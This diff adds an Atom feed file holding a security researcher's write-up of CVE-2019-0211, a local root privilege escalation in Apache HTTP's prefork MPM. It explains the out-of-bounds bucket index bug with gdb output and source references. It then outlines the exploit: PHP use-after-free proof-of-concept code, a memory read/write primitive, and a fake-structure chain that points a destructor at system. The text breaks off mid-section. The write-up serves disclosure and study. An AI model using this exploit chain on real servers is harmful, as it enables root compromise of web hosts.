@@ -1,0 +1,314 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>cfreal</title><link href="/" rel="alternate"></link><link href="/feeds/atom.xml" rel="self"></link><id>/</id><updated>2019-04-03T00:00:00+02:00</updated><entry><title>CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation</title><link href="/carpe-diem-cve-2019-0211-apache-local-root.html" rel="alternate"></link><published>2019-04-03T00:00:00+02:00</published><updated>2019-04-03T00:00:00+02:00</updated><author><name>Charles Fol</name></author><id>tag:None,2019-04-03:/carpe-diem-cve-2019-0211-apache-local-root.html</id><summary type="html">&lt;p&gt;Since version 2.4.17 (Oct 9, 2015), up until version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;From version 2.4.17 (Oct 9, 2015) to version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.
+The vulnerability is triggered when Apache gracefully restarts (&lt;code&gt;apache2ctl graceful&lt;/code&gt;).
+In standard Linux configurations, the &lt;code&gt;logrotate&lt;/code&gt; utility runs this command once a day, at 6:25AM, in order to reset log file handles.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;The vulnerability affects &lt;code&gt;mod_prefork&lt;/code&gt;, &lt;code&gt;mod_worker&lt;/code&gt; and &lt;code&gt;mod_event&lt;/code&gt;. The following bug description, code walkthrough and exploit target &lt;code&gt;mod_prefork&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;
+&lt;h1&gt;Bug description&lt;/h1&gt;
+&lt;p&gt;In MPM prefork, the main server process, running as &lt;code&gt;root&lt;/code&gt;, manages a pool of single-threaded, low-privilege (&lt;code&gt;www-data&lt;/code&gt;) worker processes, meant to handle HTTP requests.
+In order to get feedback from its workers, Apache maintains a shared-memory area (SHM), &lt;code&gt;scoreboard&lt;/code&gt;, which contains various informations such as the workers PIDs and the last request they handled.
+Each worker is meant to maintain a &lt;code&gt;process_score&lt;/code&gt; structure associated with its PID, and has full read/write access to the SHM.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;ap_scoreboard_image: pointers to the shared memory block&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) p *ap_scoreboard_image 
+$3 = {
+  global = 0x7f4a9323e008, 
+  parent = 0x7f4a9323e020, 
+  servers = 0x55835eddea78
+}
+(gdb) p ap_scoreboard_image-&amp;gt;servers[0]
+$5 = (worker_score *) 0x7f4a93240820
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;em&gt;Example of shared memory associated with worker PID 19447&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent[0]&lt;/span&gt;
+&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;19447&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;generation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;quiescing&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;\000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;not_accepting&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;\000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;connections&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;write_completion&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;lingering_close&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;keep_alive&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;suspended&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;bucket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="n"&gt;for&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ptype&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;
+&lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;process_score&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;pid_t&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;ap_generation_t&lt;/span&gt; &lt;span class="n"&gt;generation&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="n"&gt;quiescing&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="n"&gt;not_accepting&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;connections&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;write_completion&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;lingering_close&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;keep_alive&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;suspended&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;int&lt;/span&gt; &lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="n"&gt;for&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When Apache gracefully restarts, its main process kills old workers and replaces them by new ones.
+At this point, every old worker's &lt;code&gt;bucket&lt;/code&gt; value will be used by the main process to access an array of his, &lt;code&gt;all_buckets&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;all_buckets&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) p $index = ap_scoreboard_image-&amp;gt;parent[0]-&amp;gt;bucket
+(gdb) p all_buckets[$index]
+$7 = {
+  pod = 0x7f19db2c7408, 
+  listeners = 0x7f19db35e9d0, 
+  mutex = 0x7f19db2c7550
+}
+(gdb) ptype all_buckets[$index]
+type = struct prefork_child_bucket {
+    ap_pod_t *pod;
+    ap_listen_rec *listeners;
+    apr_proc_mutex_t *mutex; &amp;lt;--
+}
+(gdb) ptype apr_proc_mutex_t
+apr_proc_mutex_t {
+    apr_pool_t *pool;
+    const apr_proc_mutex_unix_lock_methods_t *meth; &amp;lt;--
+    int curr_locked;
+    char *fname;
+    ...
+}
+(gdb) ptype apr_proc_mutex_unix_lock_methods_t
+apr_proc_mutex_unix_lock_methods_t {
+    ...
+    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); &amp;lt;--
+    ...
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;No bound checks happen. Therefore, a rogue worker can change its &lt;code&gt;bucket&lt;/code&gt; index and make it point to the shared memory, in order to control the &lt;code&gt;prefork_child_bucket&lt;/code&gt; structure upon restart. Eventually, and before privileges are dropped, &lt;code&gt;mutex-&amp;gt;meth-&amp;gt;child_init()&lt;/code&gt; is called.
+This results in an &lt;strong&gt;arbitrary function call as root&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1&gt;Vulnerable code&lt;/h1&gt;
+&lt;p&gt;We'll go through &lt;code&gt;server/mpm/prefork/prefork.c&lt;/code&gt; to find out where and how the bug happens.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A rogue worker changes its &lt;code&gt;bucket&lt;/code&gt; index in shared memory to make it point to a structure of his, also in SHM.&lt;/li&gt;
+&lt;li&gt;At 06:25AM the next day, &lt;code&gt;logrotate&lt;/code&gt; requests a graceful restart from Apache.&lt;/li&gt;
+&lt;li&gt;Upon this, the main Apache process will first kill workers, and then spawn new ones.&lt;/li&gt;
+&lt;li&gt;The killing is done by sending &lt;code&gt;SIGUSR1&lt;/code&gt; to workers. They are expected to exit ASAP.&lt;/li&gt;
+&lt;li&gt;Then, &lt;code&gt;prefork_run()&lt;/code&gt; (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L853"&gt;L853&lt;/a&gt;) is called to spawn new workers. Since &lt;code&gt;retained-&amp;gt;mpm-&amp;gt;was_graceful&lt;/code&gt; is &lt;code&gt;true&lt;/code&gt; (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L861"&gt;L861&lt;/a&gt;), workers are not restarted straight away.&lt;/li&gt;
+&lt;li&gt;Instead, we enter the main loop (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L933"&gt;L933&lt;/a&gt;) and monitor dead workers' PIDs. When an old worker dies, &lt;code&gt;ap_wait_or_timeout()&lt;/code&gt; returns its PID (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L940"&gt;L940&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;The index of the &lt;code&gt;process_score&lt;/code&gt; structure associated with this PID is stored in &lt;code&gt;child_slot&lt;/code&gt; (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L948"&gt;L948&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;If the death of this worker was not fatal (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L969"&gt;L969&lt;/a&gt;), &lt;code&gt;make_child()&lt;/code&gt; is called with &lt;code&gt;ap_get_scoreboard_process(child_slot)-&amp;gt;bucket&lt;/code&gt; as a third argument (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L985"&gt;L985&lt;/a&gt;). As previously said, &lt;code&gt;bucket&lt;/code&gt;'s value has been changed by a rogue worker.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;make_child()&lt;/code&gt; creates a new child, &lt;code&gt;fork()&lt;/code&gt;ing (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L671"&gt;L671&lt;/a&gt;) the main process.&lt;/li&gt;
+&lt;li&gt;The OOB read happens (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L691"&gt;L691&lt;/a&gt;), and &lt;code&gt;my_bucket&lt;/code&gt; is therefore under the control of an attacker.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;child_main()&lt;/code&gt; is called (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L722"&gt;L722&lt;/a&gt;), and the function call happens a bit further (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433"&gt;L433&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SAFE_ACCEPT(&amp;lt;code&amp;gt;)&lt;/code&gt; will only execute &lt;code&gt;&amp;lt;code&amp;gt;&lt;/code&gt; if Apache listens &lt;em&gt;on two ports or more&lt;/em&gt;, which is often the case since a server listens over HTTP (80) and HTTPS (443).&lt;/li&gt;
+&lt;li&gt;Assuming &lt;code&gt;&amp;lt;code&amp;gt;&lt;/code&gt; is executed, &lt;code&gt;apr_proc_mutex_child_init()&lt;/code&gt; is called, which results in a call to &lt;code&gt;(*mutex)-&amp;gt;meth-&amp;gt;child_init(mutex, pool, fname)&lt;/code&gt; with mutex under control.&lt;/li&gt;
+&lt;li&gt;Privileges are dropped a bit later in the execution (&lt;a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L446"&gt;L446&lt;/a&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;The exploitation is a four step process:
+1. Obtain R/W access on a worker process
+2. Write a fake &lt;code&gt;prefork_child_bucket&lt;/code&gt; structure in the SHM
+3. Make &lt;code&gt;all_buckets[bucket]&lt;/code&gt; point to the structure
+4. Await 6:25AM to get an arbitrary function call&lt;/p&gt;
+&lt;p&gt;Advantages:
+- The main process never exits, so we know where everything is mapped by reading &lt;code&gt;/proc/self/maps&lt;/code&gt; (ASLR/PIE useless)
+- When a worker dies (or segfaults), it is automatically restarted by the main process, so there is no risk of DOSing Apache&lt;/p&gt;
+&lt;p&gt;Problems:
+- PHP does not allow to read/write &lt;code&gt;/proc/self/mem&lt;/code&gt;, which blocks us from simply editing the SHM
+- &lt;code&gt;all_buckets&lt;/code&gt; is reallocated after a graceful restart (!)&lt;/p&gt;
+&lt;h2&gt;1. Obtain R/W access on a worker process&lt;/h2&gt;
+&lt;h3&gt;PHP UAF 0-day&lt;/h3&gt;
+&lt;p&gt;Since &lt;code&gt;mod_prefork&lt;/code&gt; is often used in combination with &lt;code&gt;mod_php&lt;/code&gt;, it seems natural to exploit the vulnerability through PHP. &lt;a href=""&gt;CVE-2019-6977&lt;/a&gt; would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;PHP UAF&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;X&lt;/span&gt; &lt;span class="k"&gt;extends&lt;/span&gt; &lt;span class="nx"&gt;DateInterval&lt;/span&gt; &lt;span class="k"&gt;implements&lt;/span&gt; &lt;span class="nx"&gt;JsonSerializable&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;jsonSerialize&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;$y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nb"&gt;unset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$y&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+    &lt;span class="nv"&gt;$p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;get_aslr&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;$p&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="nv"&gt;$p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+  &lt;span class="nv"&gt;$y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;X&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PT1S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
+  &lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1234&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;$y&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ADDRESS: 0x&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;dechex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="nx"&gt;get_aslr&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is an UAF on a PHP object: we unset &lt;code&gt;$y[0]&lt;/code&gt; (an instance of &lt;code&gt;X&lt;/code&gt;), but it is still usable using &lt;code&gt;$this&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;UAF to Read/Write&lt;/h3&gt;
+&lt;p&gt;We want to achieve two things:
+- Read memory to find &lt;code&gt;all_buckets&lt;/code&gt;' address
+- Edit the SHM to change &lt;code&gt;bucket&lt;/code&gt; index and add our custom mutex structure&lt;/p&gt;
+&lt;p&gt;Luckily for us, PHP's heap is located before those two in memory.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Memory addresses of PHP's heap, &lt;code&gt;ap_scoreboard_image-&amp;gt;*&lt;/code&gt; and &lt;code&gt;all_buckets&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p
+7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so
+
+(gdb) p *ap_scoreboard_image 
+$14 = {
+  global = 0x7f4a9323e008, 
+  parent = 0x7f4a9323e020, 
+  servers = 0x55835eddea78
+}
+(gdb) p all_buckets 
+$15 = (prefork_child_bucket *) 0x7f4a9336b3f0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Since we're triggering the UAF on a PHP object, any property of this object will be UAF'd too; we can convert this &lt;code&gt;zend_object&lt;/code&gt; UAF into a &lt;code&gt;zend_string&lt;/code&gt; one.
+This is useful because of &lt;code&gt;zend_string&lt;/code&gt;'s structure:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) ptype zend_string
+type = struct _zend_string {
+    zend_refcounted_h gc;
+    zend_ulong h;
+    size_t len;
+    char val[1];
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;len&lt;/code&gt; property contains the length of the string. By incrementing it, we can read and write further in memory, and therefore access the two memory regions we're interested in: the SHM and Apache's &lt;code&gt;all_buckets&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;Locating &lt;code&gt;bucket&lt;/code&gt; indexes and &lt;code&gt;all_buckets&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;We want to change &lt;code&gt;ap_scoreboard_image-&amp;gt;parent[worker_id]-&amp;gt;bucket&lt;/code&gt; for a certain &lt;code&gt;worker_id&lt;/code&gt;. Luckily, the structure always starts at the beginning of the shared memory block, so it is easy to locate.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Shared memory location and targeted process_score structures&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@apaubuntu:~# cat /proc/6318/maps | grep rw-s
+7f4a9323e000-7f4a93252000 rw-s 00000000 00:05 57052                      /dev/zero (deleted)
+
+(gdb) p &amp;amp;ap_scoreboard_image-&amp;gt;parent[0]
+$18 = (process_score *) 0x7f4a9323e020
+(gdb) p &amp;amp;ap_scoreboard_image-&amp;gt;parent[1]
+$19 = (process_score *) 0x7f4a9323e044
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To locate &lt;code&gt;all_buckets&lt;/code&gt;, we can make use of our knowledge of the &lt;code&gt;prefork_child_bucket&lt;/code&gt; structure. We have:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Important structures of bucket items&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;prefork_child_bucket {
+    ap_pod_t *pod;
+    ap_listen_rec *listeners;
+    apr_proc_mutex_t *mutex; &amp;lt;--
+}
+
+apr_proc_mutex_t {
+    apr_pool_t *pool;
+    const apr_proc_mutex_unix_lock_methods_t *meth; &amp;lt;--
+    int curr_locked;
+    char *fname;
+
+    ...
+}
+
+apr_proc_mutex_unix_lock_methods_t {
+    unsigned int flags;
+    apr_status_t (*create)(apr_proc_mutex_t *, const char *);
+    apr_status_t (*acquire)(apr_proc_mutex_t *);
+    apr_status_t (*tryacquire)(apr_proc_mutex_t *);
+    apr_status_t (*release)(apr_proc_mutex_t *);
+    apr_status_t (*cleanup)(void *);
+    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); &amp;lt;--
+    apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);
+    apr_lockmech_e mech;
+    const char *name;
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;all_buckets[0]-&amp;gt;mutex&lt;/code&gt; will be located in the same memory region as &lt;code&gt;all_buckets[0]&lt;/code&gt;. Since &lt;code&gt;meth&lt;/code&gt; is a static structure, it will be located in &lt;code&gt;libapr&lt;/code&gt;'s &lt;code&gt;.data&lt;/code&gt;. Since &lt;code&gt;meth&lt;/code&gt; points to functions defined in &lt;code&gt;libapr&lt;/code&gt;, each of the function pointers will be located in &lt;code&gt;libapr&lt;/code&gt;'s &lt;code&gt;.text&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since we have knowledge of those region's addresses through &lt;code&gt;/proc/self/maps&lt;/code&gt;, we can go through every pointer in Apache's memory and find one that matches the structure. It will be &lt;code&gt;all_buckets[0]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;As I mentioned, &lt;code&gt;all_buckets&lt;/code&gt;'s address changes at every graceful restart. This means that when our exploit triggers, &lt;code&gt;all_buckets&lt;/code&gt;'s address will be different than the one we found. This has to be taken into account; we'll talk about this later.&lt;/p&gt;
+&lt;h2&gt;2. Write a fake &lt;code&gt;prefork_child_bucket&lt;/code&gt; structure in the SHM&lt;/h2&gt;
+&lt;h3&gt;Reaching the function call&lt;/h3&gt;
+&lt;p&gt;The code path to the arbitrary function call is the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;bucket_id = ap_scoreboard_image-&amp;gt;parent[id]-&amp;gt;bucket
+my_bucket = all_buckets[bucket_id]
+mutex = &amp;amp;my_bucket-&amp;gt;mutex
+apr_proc_mutex_child_init(mutex)
+(*mutex)-&amp;gt;meth-&amp;gt;child_init(mutex, pool, fname)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Call:reach" src="images/carpe-diem-cve-2019-0211-apache-local-root/1.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Calling something proper&lt;/h3&gt;
+&lt;p&gt;To exploit, we make &lt;code&gt;(*mutex)-&amp;gt;meth-&amp;gt;child_init&lt;/code&gt; point to &lt;code&gt;zend_object_std_dtor(zend_object *object)&lt;/code&gt;, which yields the following chain:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mutex = &amp;amp;my_bucket-&amp;gt;mutex
+[object = mutex]
+zend_object_std_dtor(object)
+ht = object-&amp;gt;properties
+zend_array_destroy(ht)
+zend_hash_destroy(ht)
+val = &amp;amp;ht-&amp;gt;arData[0]-&amp;gt;val
+ht-&amp;gt;pDestructor(val)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;pDestructor&lt;/code&gt; is set to &lt;code&gt;system&lt;/code&gt;, and &lt;code&gt;&amp;amp;ht-&amp;gt;arData[0]-&amp;gt;val&lt;/code&gt; is a string.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Call:exec" src="images/carpe-diem-cve-2019-0211-apache-local-root/2.png"&gt;&lt;/p&gt;
+&lt;p&gt;As you can see, both leftmost structures are superimposed.&lt;/p&gt;
+&lt;h2&gt;3. Make &lt;code&gt;all_buckets[bucket]&lt;/code&gt; point to the structure&lt;/h2&gt;
+&lt;h3&gt;Problem and solution&lt;/h3&gt;
+&lt;p&gt;Right now, if &lt;code&gt;all_buckets&lt;/code&gt;' address was unchanged in between restarts, our exploit would be over:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Get R/W over all memory after PHP's heap&lt;/li&gt;
+&lt;li&gt;Find &lt;code&gt;all_buckets&lt;/code&gt; by matching its structure&lt;/li&gt;
+&lt;li&gt;Put our structure in the SHM&lt;/li&gt;
+&lt;li&gt;Change one of the &lt;code&gt;process_score.bucket&lt;/code&gt; in the SHM so that &lt;code&gt;all_bucket[bucket]-&amp;gt;mutex&lt;/code&gt; points to our payload&lt;/li&gt;
